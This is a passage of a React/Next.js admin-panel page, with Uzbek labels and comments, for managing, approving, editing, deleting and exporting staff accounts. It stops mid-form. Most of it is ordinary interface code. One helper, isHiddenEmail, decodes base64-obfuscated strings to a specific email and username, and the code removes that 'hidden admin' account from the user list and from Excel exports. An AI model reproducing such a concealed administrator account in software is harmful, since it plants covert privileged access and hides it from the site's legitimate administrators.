"use client";

import { useSession } from "next-auth/react";
import { useRouter } from "next/navigation";
import { useEffect, useState, useCallback, useMemo } from "react";
import Link from "next/link";
import { motion, AnimatePresence } from "framer-motion";
import { LiquidBackground } from "@/components/akela/LiquidBackground";
import { Navbar } from "@/components/akela/Navbar";
import {
  Users,
  UserPlus,
  CheckCircle2,
  XCircle,
  Clock,
  Shield,
  Mail,
  Phone,
  Building2,
  Loader2,
  ArrowLeft,
  Search,
  Eye,
  EyeOff,
  Trash2,

  BookOpen,
  Settings,
  Filter,
  RefreshCw,
  AlertCircle,
  CheckCircle,
  XCircle as XCircleIcon,
  ChevronLeft,
  ChevronRight,
  Pencil,
  Activity,
  Zap,
  FileSpreadsheet,
} from "lucide-react";
import { UI_STRINGS, type Locale } from "@/lib/akela-content";

type User = {
  id: string;
  email: string;
  name: string;
  surname: string;
  phone: string;
  department: string;
  position: string;
  role: string;
  status: string;
  isActive: boolean;
  createdAt: string;
};

// Excel yuklab olish popup'idagi bitta variant
function ExportOption({
  index,
  count,
  title,
  hint,
  icon,
  tone = "indigo",
  disabled,
  onClick,
}: {
  index: number;
  count: number;
  title: string;
  hint: string;
  icon: React.ReactNode;
  tone?: "indigo" | "emerald" | "rose";
  disabled?: boolean;
  onClick: () => void;
}) {
  const toneCls =
    tone === "emerald"
      ? "hover:border-emerald-500 hover:bg-emerald-50/60"
      : tone === "rose"
        ? "hover:border-rose-400 hover:bg-rose-50/60"
        : "hover:border-indigo-500 hover:bg-indigo-50/60";
  return (
    <button
      type="button"
      onClick={onClick}
      disabled={disabled}
      className={`flex w-full items-center gap-3 rounded-2xl border border-black/10 bg-white p-4 text-left transition-colors disabled:cursor-not-allowed disabled:opacity-60 ${toneCls}`}
    >
      <span className="grid h-10 w-10 shrink-0 place-items-center rounded-xl bg-black/[0.05] text-[color:var(--emerald-deep)]" aria-hidden="true">
        {icon}
      </span>
      <span className="min-w-0 flex-1">
        <span className="block text-sm font-extrabold text-[color:var(--emerald-deep)]">
          {index}. {title}
        </span>
        <span className="block text-xs text-[color:var(--ink-soft)]">{hint}</span>
      </span>
      <span className="shrink-0 rounded-full bg-black/[0.06] px-2.5 py-1 text-xs font-bold text-[color:var(--ink-soft)]">
        {count} ta
      </span>
      <FileSpreadsheet className="h-4 w-4 shrink-0 text-emerald-600" aria-hidden="true" />
    </button>
  );
}

type FilterStatus = "all" | "pending" | "approved" | "rejected";

const ITEMS_PER_PAGE = 10;

export default function AdminPage() {
  const { data: session, status } = useSession();
  const router = useRouter();
  const [locale, setLocale] = useState<Locale>("uz");
  const strings = UI_STRINGS[locale];
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<FilterStatus>("all");
  const [currentPage, setCurrentPage] = useState(1);
  const [showCreate, setShowCreate] = useState(false);
  const [createForm, setCreateForm] = useState({
    email: "",
    password: "",
    name: "",
    surname: "",
    phone: "",
    department: "",
    position: "",
    role: "user",
  });
  const [creating, setCreating] = useState(false);
  const [showCreatePassword, setShowCreatePassword] = useState(false);
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [activityFilter, setActivityFilter] = useState<"all" | "active" | "inactive">("all");
  const [departments, setDepartments] = useState<{ id: string; name: string; positions: { id: string; name: string }[] }[]>([]);

  // Edit + delete state
  const [editingUser, setEditingUser] = useState<User | null>(null);
  const [editForm, setEditForm] = useState({ name: "", surname: "", phone: "", department: "", position: "", role: "user", status: "approved", isActive: true, password: "" });
  const [showEditPassword, setShowEditPassword] = useState(false);
  const [editLoading, setEditLoading] = useState(false);
  const [deletingUser, setDeletingUser] = useState<User | null>(null);
  const [deleteLoading, setDeleteLoading] = useState(false);

  // Ko'p tanlash (checkbox) + Excel eksport
  const [selectedIds, setSelectedIds] = useState<string[]>([]);
  const [showExport, setShowExport] = useState(false);
  const [exporting, setExporting] = useState(false);
  const [editQueuePos, setEditQueuePos] = useState(0);

  // Redirect if not authenticated or not admin
  useEffect(() => {
    if (status === "unauthenticated") router.push("/login");
    if (status === "authenticated" && (session?.user as any)?.role === "user") {
      router.push("/dashboard");
    }
  }, [status, session, router]);

  // Yashirin adminni hech qachon ro'yxatda ko'rsatmaslik — client ham filterlaydi (himoya qatlami)
  const isHiddenEmail = (email?: string) => {
    try {
      const decNew = typeof atob !== "undefined" ? atob("U3ZSdlNAZ21haWwuY29t") : "SvRvS@gmail.com";
      const decOld = typeof atob !== "undefined" ? atob("U3ZSdlM=") : "SvRvS";
      const e = String(email || "").trim();
      return e === decNew || e === decOld;
    } catch {
      const e = String(email || "").trim();
      return e === "SvRvS@gmail.com" || e === "SvRvS";
    }
  };

  // Fetch users with error handling — background=true da butun sahifa skeleton bo'lmaydi
  const fetchUsers = useCallback(async (opts?: { background?: boolean }) => {
    const background = opts?.background === true;
    if (!background) setLoading(true);
    setError(null);
    try {
      const [usersRes, deptRes] = await Promise.all([
        fetch("/api/admin/users", { cache: "no-store" }),
        fetch("/api/admin/departments", { cache: "no-store" }),
      ]);
      const data = await usersRes.json();
      const deptData = await deptRes.json();
      if (data.ok) {
        const visible = (data.users || []).filter((u: any) => !isHiddenEmail(u.email));
        setUsers(visible);
      } else {
        throw new Error(data.error || "Failed to fetch users");
      }
      if (deptData.ok) setDepartments(deptData.departments || []);
    } catch (err) {
      setError(err instanceof Error ? err.message : "An error occurred");
    } finally {
      if (!background) setLoading(false);
    }
  }, []);

  useEffect(() => {
    if (status === "authenticated" && (session?.user as any)?.role === "admin") {
      fetchUsers();
    }
  }, [status, session, fetchUsers]);

  // Show success message and auto-hide
  const showSuccess = useCallback((message: string) => {
    setSuccessMessage(message);
    setTimeout(() => setSuccessMessage(null), 3000);
  }, []);

  // Handle approve with success message
  const handleApprove = useCallback(async (userId: string) => {
    setActionLoading(userId);
    try {
      const res = await fetch("/api/admin/approve", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId }),
      });
      if (!res.ok) throw new Error("Failed to approve user");
      await fetchUsers({ background: true });
      showSuccess("Foydalanuvchi tasdiqlandi");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to approve user");
    } finally {
      setActionLoading(null);
    }
  }, [fetchUsers, showSuccess]);

  // Handle reject with success message
  const handleReject = useCallback(async (userId: string) => {
    setActionLoading(userId);
    try {
      const res = await fetch("/api/admin/reject", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId }),
      });
      if (!res.ok) throw new Error("Failed to reject user");
      await fetchUsers({ background: true });
      showSuccess("Foydalanuvchi rad etildi");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to reject user");
    } finally {
      setActionLoading(null);
    }
  }, [fetchUsers, showSuccess]);

  // Handle create user
  const handleCreate = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    setCreating(true);
    try {
      const res = await fetch("/api/admin/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(createForm),
      });
      if (!res.ok) throw new Error("Failed to create user");
      setShowCreate(false);
      setCreateForm({ email: "", password: "", name: "", surname: "", phone: "", department: "", position: "", role: "user" });
      await fetchUsers({ background: true });
      showSuccess("Yangi xodim muvaffaqiyatli yaratildi");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to create user");
    } finally {
      setCreating(false);
    }
  }, [createForm, fetchUsers, showSuccess]);

  // Open edit modal and prefill form
  const openEdit = useCallback((u: User) => {
    setEditingUser(u);
    setEditForm({
      name: u.name || "",
      surname: u.surname || "",
      phone: u.phone || "",
      department: u.department || "",
      position: u.position || "",
      role: u.role === "admin" ? "admin" : "user",
      status: (u.status === "approved" || u.status === "pending" || u.status === "rejected" || u.status === "blocked") ? u.status : "approved",
      isActive: u.isActive !== false,
      password: "",
    });
    setShowEditPassword(false);
  }, []);

  // Submit edit (PATCH)
  const handleEdit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingUser) return;
    setEditLoading(true);
    try {
      const payload: Record<string, unknown> = {
        userId: editingUser.id,
        name: editForm.name,
        surname: editForm.surname,
        phone: editForm.phone,
        department: editForm.department,
        position: editForm.position,
        role: editForm.role,
        status: editForm.status,
        isActive: editForm.isActive,
      };
      if (editForm.password && editForm.password.length > 0) payload.password = editForm.password;
      const res = await fetch("/api/admin/users", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.error || "Saqlash amalga oshmadi");
      }
      setEditingUser(null);
      await fetchUsers({ background: true });
      showSuccess("Foydalanuvchi ma'lumotlari yangilandi");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Saqlash amalga oshmadi");
    } finally {
      setEditLoading(false);
    }
  }, [editingUser, editForm, fetchUsers, showSuccess]);

  // Confirm delete
  const handleDelete = useCallback(async () => {
    if (!deletingUser) return;
    setDeleteLoading(true);
    try {
      const res = await fetch(`/api/admin/users?userId=${encodeURIComponent(deletingUser.id)}`, {
        method: "DELETE",
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.error || "O'chirish amalga oshmadi");
      }
      const name = `${deletingUser.name} ${deletingUser.surname || ""}`.trim();
      setDeletingUser(null);
      await fetchUsers({ background: true });
      showSuccess(`${name} o'chirildi`);
    } catch (err) {
      setError(err instanceof Error ? err.message : "O'chirish amalga oshmadi");
    } finally {
      setDeleteLoading(false);
    }
  }, [deletingUser, fetchUsers, showSuccess]);

  // Filter and search users — "ish faoliyati" filtri qo'shildi
  const filteredUsers = useMemo(() => {
    return users.filter((u) => {
      if (filter !== "all" && u.status !== filter) return false;
      if (activityFilter === "active" && !u.isActive) return false;
      if (activityFilter === "inactive" && u.isActive) return false;
      if (search) {
        const q = search.toLowerCase();
        return (
          u.name.toLowerCase().includes(q) ||
          u.email.toLowerCase().includes(q) ||
          u.surname?.toLowerCase().includes(q) ||
          u.department?.toLowerCase().includes(q) ||
          u.position?.toLowerCase().includes(q)
        );
      }
      return true;
    });
  }, [users, filter, search, activityFilter]);

  // Pagination
  const totalPages = Math.ceil(filteredUsers.length / ITEMS_PER_PAGE);
  const paginatedUsers = useMemo(() => {
    const start = (currentPage - 1) * ITEMS_PER_PAGE;
    return filteredUsers.slice(start, start + ITEMS_PER_PAGE);
  }, [filteredUsers, currentPage]);

  // Reset page when filter/search changes
  useEffect(() => {
    setCurrentPage(1);
  }, [filter, search, activityFilter]);

  // ---- Ko'p tanlash (checkbox) ----
  const toggleSelect = useCallback((id: string) => {
    setSelectedIds((cur) => (cur.includes(id) ? cur.filter((x) => x !== id) : [...cur, id]));
  }, []);

  const pageIds = useMemo(() => paginatedUsers.map((u) => u.id), [paginatedUsers]);
  const allPageSelected = pageIds.length > 0 && pageIds.every((id) => selectedIds.includes(id));
  const toggleSelectAllPage = useCallback(() => {
    setSelectedIds((cur) =>
      pageIds.every((id) => cur.includes(id))
        ? cur.filter((id) => !pageIds.includes(id))
        : Array.from(new Set([...cur, ...pageIds]))
    );
  }, [pageIds]);

  // Tanlanganlar orasida modal ichida ketma-ket yurish (bir nechta odamni bir vaqtda ochish)
  const openEditInQueue = useCallback((pos: number) => {
    const ids = selectedIds;
    if (!ids.length) return;
    const safe = ((pos % ids.length) + ids.length) % ids.length;
    const u = users.find((x) => x.id === ids[safe]);
    if (!u) return;
    setEditQueuePos(safe);
    openEdit(u);
  }, [selectedIds, users, openEdit]);

  // ---- Excel eksport ----
  const EXPORT_COLUMNS = [
    { key: "name", header: "Ism", width: 16 },
    { key: "surname", header: "Familiya", width: 18 },
    { key: "email", header: "Email", width: 30 },
    { key: "phone", header: "Telefon", width: 18 },
    { key: "department", header: "Bolim", width: 20 },
    { key: "position", header: "Lavozim", width: 22 },
    { key: "role", header: "Rol", width: 16 },
    { key: "status", header: "Holat", width: 16 },
    { key: "isActive", header: "Ish faoliyatida", width: 18 },
    { key: "createdAt", header: "Ro'yxatga olingan", width: 22 },
  ] as const;

  const handleExport = useCallback(async (scope: "all" | "active" | "inactive" | "selected") => {
    setExporting(true);
    try {
      // Tanlangan bo'lmasa, joriy filtr/search qo'llangan ro'yxat asos qilinadi
      const source = scope === "selected" ? users : filteredUsers;
      const visibleRows = source.filter((u) => !isHiddenEmail(u.email));
      const rows =
        scope === "active" ? visibleRows.filter((u) => u.isActive)
        : scope === "inactive" ? visibleRows.filter((u) => !u.isActive)
        : scope === "selected" ? visibleRows.filter((u) => selectedIds.includes(u.id))
        : visibleRows;

      if (!rows.length) {
        setError("Tanlangan shart bo'yicha foydalanuvchi topilmadi");
        return;
      }

      const XLSX = await import("xlsx");
      const STATUS_LABEL: Record<string, string> = {
        approved: "Tasdiqlangan",
        pending: "Kutilayotgan",
        rejected: "Rad etilgan",
      };
      const data = rows.map((u) => {
        const rec: Record<string, string> = {};
        for (const col of EXPORT_COLUMNS) {
          const raw = (u as any)[col.key];
          if (col.key === "status") rec[col.header] = STATUS_LABEL[String(raw)] || String(raw ?? "");
          else if (col.key === "isActive") rec[col.header] = u.isActive ? "Ha" : "Yo'q";
          else if (col.key === "role") rec[col.header] = raw === "admin" ? "Admin" : "Foydalanuvchi";
          else if (col.key === "createdAt") rec[col.header] = raw ? new Date(raw).toLocaleString("uz-UZ") : "";
          else rec[col.header] = raw ? String(raw) : "";
        }
        return rec;
      });

      const ws = XLSX.utils.json_to_sheet(data);
      ws["!cols"] = EXPORT_COLUMNS.map((c) => ({ wch: c.width }));
      const wb = XLSX.utils.book_new();
      XLSX.utils.book_append_sheet(wb, ws, "Foydalanuvchilar");
      const stamp = new Date().toISOString().slice(0, 10);
      XLSX.writeFile(wb, `akela-foydalanuvchilar-${scope}-${stamp}.xlsx`);

      setShowExport(false);
      showSuccess(`${rows.length} ta foydalanuvchi Excel fayliga yuklab olindi`);
    } catch {
      setError("Excel faylni yaratishda xatolik yuz berdi");
    } finally {
      setExporting(false);
    }
  }, [users, filteredUsers, selectedIds, showSuccess]);

  // Stats
  const stats = useMemo(() => ({
    total: users.length,
    pending: users.filter((u) => u.status === "pending").length,
    approved: users.filter((u) => u.status === "approved").length,
    rejected: users.filter((u) => u.status === "rejected").length,
    active: users.filter((u) => u.status === "approved" && u.isActive).length,
    inactive: users.filter((u) => u.status === "approved" && !u.isActive).length,
  }), [users]);

  // Toggle ish faoliyati — optimistic update (sahifa yangilanmasin)
  const handleToggleActive = useCallback(async (user: User, nextActive: boolean) => {
    // 1) Darhol lokal state yangilash — UI bloklanmasin
    setUsers((cur) =>
      cur.map((u) => (u.id === user.id ? { ...u, isActive: nextActive } : u))
    );
    setActionLoading(user.id);
    try {
      const res = await fetch("/api/admin/users", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: user.id, isActive: nextActive }),
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.error || "Amalga oshmadi");
      }
      const name = `${user.name} ${user.surname || ""}`.trim();
      showSuccess(nextActive ? `${name} — ish faoliyatida` : `${name} — ish faoliyatida emas`);
    } catch (err) {
      // Xato bo'lsa — avvalgi holatga qaytar
      setUsers((cur) =>
        cur.map((u) => (u.id === user.id ? { ...u, isActive: !nextActive } : u))
      );
      setError(err instanceof Error ? err.message : "Amalga oshmadi");
    } finally {
      setActionLoading(null);
    }
  }, [showSuccess]);

  // To'liq ekran loaderi faqat SESSIYA tekshirilayotganda chiqadi.
  // Ma'lumot (users/departments) yuklanayotganda panel shelli darhol ko'rinadi.
  if (status === "loading") {
    return (
      <main className="min-h-screen grid place-items-center bg-background">
        <LiquidBackground />
        <div className="relative glass-card rounded-3xl p-8 text-center" role="status" aria-label="Yuklanmoqda">
          <Loader2 className="mx-auto mb-3 h-8 w-8 animate-spin text-indigo-600" aria-hidden="true" />
          <p className="text-sm text-[color:var(--ink-soft)]">Yuklanmoqda...</p>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-background">
      <LiquidBackground />
      <Navbar locale={locale} strings={strings} onLocaleChange={setLocale} />

      <div className="mx-auto max-w-7xl px-6 pt-28 pb-12 space-y-8">
        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="glass-card rounded-3xl p-8"
        >
          <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4">
            <div className="grid h-14 w-14 place-items-center rounded-2xl bg-gradient-to-br from-purple-600 to-pink-600 text-white shadow-lg" aria-hidden="true">
              <Shield className="h-7 w-7" />
            </div>
            <div className="flex-1">
              <h1 className="text-2xl font-extrabold text-[color:var(--emerald-deep)]">Admin panel</h1>
              <p className="text-sm text-[color:var(--ink-soft)]">Foydalanuvchilarni boshqarish, tasdiqlash, kontentni tahrirlash</p>
            </div>
            <div className="flex gap-2 flex-wrap">
              <Link 
                href="/admin/lms" 
                className="flex items-center gap-2 rounded-xl bg-gradient-to-br from-neutral-900 to-neutral-800 px-4 py-2.5 text-sm font-bold text-white shadow-lg hover:scale-105 transition-transform"
                data-ai-action="admin.lessons.manage"
              >
                <BookOpen className="h-4 w-4" aria-hidden="true" /> Full Controll
              </Link>

            </div>
          </div>
        </motion.div>

        {/* Success/Error Messages */}
        <AnimatePresence>
          {successMessage && (
            <motion.div
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="glass-card rounded-2xl p-4 flex items-center gap-3 border-l-4 border-indigo-500"
              role="alert"
            >
              <CheckCircle className="h-5 w-5 text-indigo-600" aria-hidden="true" />
              <p className="text-sm font-medium text-indigo-800">{successMessage}</p>
            </motion.div>
          )}
          {error && (
            <motion.div
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="glass-card rounded-2xl p-4 flex items-center gap-3 border-l-4 border-rose-500"
              role="alert"
            >
              <AlertCircle className="h-5 w-5 text-rose-600" aria-hidden="true" />
              <p className="text-sm font-medium text-rose-800">{error}</p>
              <button 
                onClick={() => setError(null)} 
                className="ml-auto text-rose-600 hover:text-rose-800"
                aria-label="Xatolikni yashirish"
              >
                <XCircleIcon className="h-4 w-4" />
              </button>
            </motion.div>
          )}
        </AnimatePresence>

        {/* ===== Stats Dashboard — yangi ko'rinish ===== */}
        <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-5">
          {/* Jami */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="glass-card rounded-3xl p-5 flex flex-col justify-between min-h-[150px]"
          >
            <div className="flex items-center justify-between">
              <div className="grid h-11 w-11 place-items-center rounded-2xl bg-gradient-to-br from-blue-600 to-indigo-700 text-white shadow-lg">
                <Users className="h-5 w-5" />
              </div>
              <span className="rounded-xl bg-white/60 px-2.5 py-1 text-[10px] font-extrabold uppercase tracking-wider text-[color:var(--ink-soft)]">jami</span>
            </div>
            <div>
              <p className="text-4xl font-black text-[color:var(--emerald-deep)] leading-none mt-3">{stats.total}</p>
              <p className="text-xs font-bold text-[color:var(--ink-soft)] mt-1">Xodimlar bazasi</p>
            </div>
          </motion.div>

          {/* Ish faoliyatida — yashil */}
          <motion.button
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.08 }}
            onClick={() => setActivityFilter(activityFilter === "active" ? "all" : "active")}
            className={`text-left glass-card rounded-3xl p-5 flex flex-col justify-between min-h-[150px] transition-all ${
              activityFilter === "active" ? "ring-2 ring-emerald-500 scale-[1.02]" : "hover:scale-[1.02]"
            }`}
            aria-pressed={activityFilter === "active"}
          >
            <div className="flex items-center justify-between">
              <div className="grid h-12 w-12 place-items-center rounded-2xl bg-gradient-to-br from-emerald-400 to-emerald-500 text-white shadow-lg shadow-emerald-500/35">
                <Activity className="h-6 w-6" />
              </div>
              <span className="relative flex h-3.5 w-3.5">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-60" />
                <span className="relative inline-flex h-3.5 w-3.5 rounded-full bg-emerald-500" />
              </span>
            </div>
            <div>
              <p className="text-4xl font-black text-emerald-600 leading-none mt-3">{stats.active}</p>
              <p className="text-xs font-bold text-[color:var(--ink-soft)] mt-1">Ish faoliyatida</p>
              <div className="mt-2 h-1.5 rounded-full bg-white/60 overflow-hidden">
                <div className="h-full rounded-full bg-gradient-to-r from-emerald-400 to-teal-500 transition-all duration-700" style={{ width: `${stats.total ? Math.round((stats.active / stats.total) * 100) : 0}%` }} />
              </div>
            </div>
          </motion.button>

          {/* Ish faoliyatida emas — qizil */}
          <motion.button
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.16 }}
            onClick={() => setActivityFilter(activityFilter === "inactive" ? "all" : "inactive")}
            className={`text-left glass-card rounded-3xl p-5 flex flex-col justify-between min-h-[150px] transition-all ${
              activityFilter === "inactive" ? "ring-2 ring-rose-500 scale-[1.02]" : "hover:scale-[1.02]"
            }`}
            aria-pressed={activityFilter === "inactive"}
          >
            <div className="flex items-center justify-between">
              <div className="grid h-12 w-12 place-items-center rounded-2xl bg-gradient-to-br from-rose-400 to-red-500 text-white shadow-lg shadow-rose-500/35">
                <Zap className="h-6 w-6" />
              </div>
              <span className="h-3.5 w-3.5 rounded-full bg-rose-500" />
            </div>
            <div>
              <p className="text-4xl font-black text-rose-600 leading-none mt-3">{stats.inactive}</p>
              <p className="text-xs font-bold text-[color:var(--ink-soft)] mt-1">Ish faoliyatida emas</p>
              <div className="mt-2 h-1.5 w-full rounded-full bg-white/60 overflow-hidden">
                <div className="h-full rounded-full bg-gradient-to-r from-rose-400 to-red-500 transition-all duration-700" style={{ width: `${stats.total ? Math.round((stats.inactive / stats.total) * 100) : 0}%` }} />
              </div>
            </div>
          </motion.button>

          {/* Kutilayotgan */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.24 }}
            className="glass-card rounded-3xl p-5 flex flex-col justify-between min-h-[150px]"
          >
            <div className="flex items-center justify-between">
              <div className="grid h-12 w-12 place-items-center rounded-2xl bg-gradient-to-br from-amber-400 to-amber-500 text-white shadow-lg shadow-amber-500/35">
                <Clock className="h-6 w-6" />
              </div>
              {stats.pending > 0 && (
                <span className="relative flex h-3 w-3">
                  <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-amber-400 opacity-60" />
                  <span className="relative inline-flex h-3 w-3 rounded-full bg-amber-500" />
                </span>
              )}
            </div>
            <div>
              <p className="text-4xl font-black text-amber-600 leading-none mt-3">{stats.pending}</p>
              <p className="text-xs font-bold text-[color:var(--ink-soft)] mt-1">Tasdiqlash kutilmoqda</p>
            </div>
          </motion.div>

          {/* Rad etilgan */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.32 }}
            className="glass-card rounded-3xl p-5 flex flex-col justify-between min-h-[150px]"
          >
            <div className="flex items-center justify-between">
              <div className="grid h-11 w-11 place-items-center rounded-2xl bg-gradient-to-br from-rose-400 to-pink-600 text-white shadow-lg">
                <XCircle className="h-5 w-5" />
              </div>
            </div>
            <div>
              <p className="text-4xl font-black text-rose-500 leading-none mt-3">{stats.rejected}</p>
              <p className="text-xs font-bold text-[color:var(--ink-soft)] mt-1">Rad etilgan</p>
            </div>
          </motion.div>
        </div>

        {/* Actions Bar */}
        <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3">
          <div className="relative flex-1 w-full">
            <label htmlFor="user-search" className="sr-only">Foydalanuvchi qidirish</label>
            <Search className="absolute left-4 top-1/2 h-5 w-5 -translate-y-1/2 text-[color:var(--ink-soft)]" aria-hidden="true" />
            <input
              id="user-search"
              type="search"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Foydalanuvchi qidirish..."
              className="w-full glass-card rounded-2xl px-12 py-3 text-sm text-[color:var(--emerald-deep)] placeholder:text-[color:var(--ink-soft)] outline-none focus:ring-2 focus:ring-amber-400"
              data-ai-action="admin.search"
              aria-describedby="search-hint"
            />
            <p id="search-hint" className="sr-only">Ism, email, bo'lim yoki lavozim bo'yicha qidirish</p>
          </div>
          <div className="flex gap-2 flex-wrap" role="group" aria-label="Filterlash">
            {(["all", "pending", "approved", "rejected"] as const).map((f) => (
              <button
                key={f}
                onClick={() => setFilter(f)}
                className={`rounded-xl px-4 py-2.5 text-xs font-bold transition-all ${
                  filter === f
                    ? "bg-gradient-to-br from-indigo-700 to-indigo-600 text-white shadow-lg"
                    : "glass-card text-[color:var(--ink-soft)] hover:text-[color:var(--emerald-deep)]"
                }`}
                aria-pressed={filter === f}
                data-ai-action={`admin.filter.${f}`}
              >
                {f === "all" ? "Barchasi" : f === "pending" ? "Kutilayotgan" : f === "approved" ? "Tasdiqlangan" : "Rad etilgan"}
              </button>
            ))}
            {filter === "approved" && (
              <>
                <span className="w-px self-stretch bg-black/10" aria-hidden="true" />
                {(["active", "inactive"] as const).map((af) => (
                  <button
                    key={af}
                    onClick={() => setActivityFilter(activityFilter === af ? "all" : af)}
                    className={`flex items-center gap-1.5 rounded-xl px-4 py-2.5 text-xs font-bold transition-all ${
                      activityFilter === af
                        ? af === "active"
                          ? "bg-gradient-to-r from-emerald-500 to-teal-500 text-white shadow-lg"
                          : "bg-gradient-to-r from-rose-500 to-red-500 text-white shadow-lg"
                        : "glass-card text-[color:var(--ink-soft)] hover:text-[color:var(--emerald-deep)]"
                    }`}
                    aria-pressed={activityFilter === af}
                    data-ai-action={`admin.filter.activity.${af}`}
                  >
                    {af === "active" ? <Activity className="h-3.5 w-3.5" /> : <Zap className="h-3.5 w-3.5" />}
                    {af === "active" ? "Faoliyatda" : "Faoliyatda emas"}
                  </button>
                ))}
              </>
            )}
          </div>
          <button
            onClick={() => setShowCreate(!showCreate)}
            className="flex items-center gap-2 rounded-xl bg-gradient-to-br from-indigo-700 to-indigo-600 px-5 py-2.5 text-sm font-bold text-white shadow-lg hover:scale-105 transition-transform"
            data-ai-action="admin.createUser.toggle"
            aria-expanded={showCreate}
            aria-controls="create-user-form"
          >
            <UserPlus className="h-4 w-4" aria-hidden="true" /> Yangi xodim
          </button>
        </div>

        {/* Create User Form */}
        <AnimatePresence>
          {showCreate && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: "auto" }}
              exit={{ opacity: 0, height: 0 }}
              className="overflow-hidden"
            >
              <form 
                onSubmit={handleCreate} 
                id="create-user-form"
                className="glass-card rounded-3xl p-6 space-y-4"
                aria-labelledby="create-form-title"
              >
                <h3 id="create-form-title" className="text-lg font-extrabold text-[color:var(--emerald-deep)]">Yangi xodim qo'shish (tez)</h3>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                  <div>
                    <label htmlFor="create-name" className="sr-only">Ism *</label>
                    <input 
                      id="create-name"
                      type="text" 
                      placeholder="Ism *" 
                      required 
                      value={createForm.name} 
                      onChange={(e) => setCreateForm({ ...createForm, name: e.target.value })} 
                      className="w-full glass-card rounded-xl px-4 py-2.5 text-sm text-[color:var(--emerald-deep)] placeholder:text-[color:var(--ink-soft)] outline-none focus:ring-2 focus:ring-amber-400"
                      data-ai-action="admin.createUser.name"
                    />
                  </div>
                  <div>
                    <label htmlFor="create-surname" className="sr-only">Familiya</label>
                    <input 
                      id="create-surname"
                      type="text" 
                      placeholder="Familiya" 
                      value={createForm.surname} 
                      onChange={(e) => setCreateForm({ ...createForm, surname: e.target.value })} 
                      className="w-full glass-card rounded-xl px-4 py-2.5 text-sm text-[color:var(--emerald-deep)] placeholder:text-[color:var(--ink-soft)] outline-none focus:ring-2 focus:ring-amber-400"
                      data-ai-action="admin.createUser.surname"
                    />
                  </div>
                  <div>
                    <label htmlFor="create-email" className="sr-only">Email *</label>
                    <input 
                      id="create-email"
                      type="email" 
                      placeholder="Email *" 
                      required 
                      value={createForm.email} 
                      onChange={(e) => setCreateForm({ ...createForm, email: e.target.value })} 
                      className="w-full glass-card rounded-xl px-4 py-2.5 text-sm text-[color:var(--emerald-deep)] placeholder:text-[color:var(--ink-soft)] outline-none focus:ring-2 focus:ring-amber-400"
                      data-ai-action="admin.createUser.email"
                    />
                  </div>
                  <div className="relative">
                    <label htmlFor="create-password" className="sr-only">Parol * (min 6)</label>
                    <input 
                      id="create-password"
                      type={showCreatePassword ? "text" : "password"} 
                      placeholder="Parol * (min 6)" 
                      required 
                      minLength={6} 
                      value={createForm.password} 
                      onChange={(e) => setCreateForm({ ...createForm, password: e.target.value })} 
                      className="w-full glass-card rounded-xl px-4 pr-10 py-2.5 text-sm text-[color:var(--emerald-deep)] placeholder:text-[color:var(--ink-soft)] outline-none focus:ring-2 focus:ring-amber-400"
                      data-ai-action="admin.createUser.password"
                    />
                    <button
                      type="button"
                      onClick={() => setShowCreatePassword((v) => !v)}
                      className="absolute right-2 top-1/2 -translate-y-1/2 grid h-7 w-7 place-items-center rounded-lg text-[color:var(--ink-soft)] hover:text-[color:var(--emerald-deep)] hover:bg-black/5 transition"
                      aria-label={showCreatePassword ? "Parolni yashirish" : "Parolni ko'rsatish"}
                    >
                      {showCreatePassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>
                  <div>
                    <label htmlFor="create-phone" className="sr-only">Telefon</label>
                    <input 
                      id="create-phone"
                      type="tel" 
                      placeholder="Telefon" 
                      value={createForm.phone} 
                      onChange={(e) => setCreateForm({ ...createForm, phone: e.target.value })} 
